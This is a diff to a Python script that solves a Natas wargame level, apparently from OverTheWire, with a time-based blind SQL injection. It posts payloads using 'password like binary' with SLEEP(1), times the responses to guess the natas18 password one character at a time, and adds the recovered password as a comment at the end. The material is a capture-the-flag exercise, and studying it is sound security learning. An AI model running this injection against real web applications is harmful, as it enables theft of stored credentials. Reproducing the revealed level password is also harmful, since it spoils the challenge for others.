@@ -37,26 +37,24 @@ headers = {
 UNION SELECT IF(SUBSTRING(user_password,1,1) = CHAR(50),BENCHMARK(5000000,ENCODE('MSG','by 5 seconds')),null) FROM users WHERE user_id = 1;
 """
 
-sql_pre = "natas18\" UNION SELECT IF(SUBSTRING(password,1,"
-sql_mid = ") = \""
-sql_end = "\", BENCHMARK(5000000,ENCODE('MSG','by 5 seconds')),null) FROM users WHERE username = \"natas18\";--"
+sql_end = "%\" AND SLEEP(1)#"
 
 legal_chars_string = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
-# body_string = "username=natas16\" and password like binary \""
+sql_pre = "natas18\" and password like binary \""
 
 example_password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"
 
 def tryletter(prefix, letter):
     test_password = prefix + letter
-    body_string_test = "username=" + sql_pre + str(len(test_password)) + sql_mid + test_password + sql_end
-    # response = requests.post(url, data=body_string_test, headers=headers) #proxies = { "http" : "http://127.0.0.1:9090"})
+    body_string_test = "username=" + sql_pre + test_password + sql_end
+    response = requests.post(url, data=body_string_test, headers=headers) #proxies = { "http" : "http://127.0.0.1:9090"})
     # response = requests.post(url, data=body_string_test, headers=headers, proxies = { "http" : "http://127.0.0.1:9090"})
     new_url = url + "&" + body_string_test
-    response = requests.get(new_url, data=body_string_test, headers=headers)#, proxies = { "http" : "http://127.0.0.1:9090"})
+    #response = requests.get(new_url, data=body_string_test, headers=headers, proxies = { "http" : "http://127.0.0.1:9090"})
 
-    print(test_password + " " + str(response.elapsed.total_seconds()))
+    #print(test_password + " " + str(response.elapsed.total_seconds()))
 
-    if re.search("This user exists", response.text):
+    if response.elapsed.total_seconds() > 1:
         return True
 
     return False
@@ -72,3 +70,5 @@ while len(prefix) < len(example_password):
             prefix += char
             break
     print("prefix: " + prefix)
+
+# natas18 xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
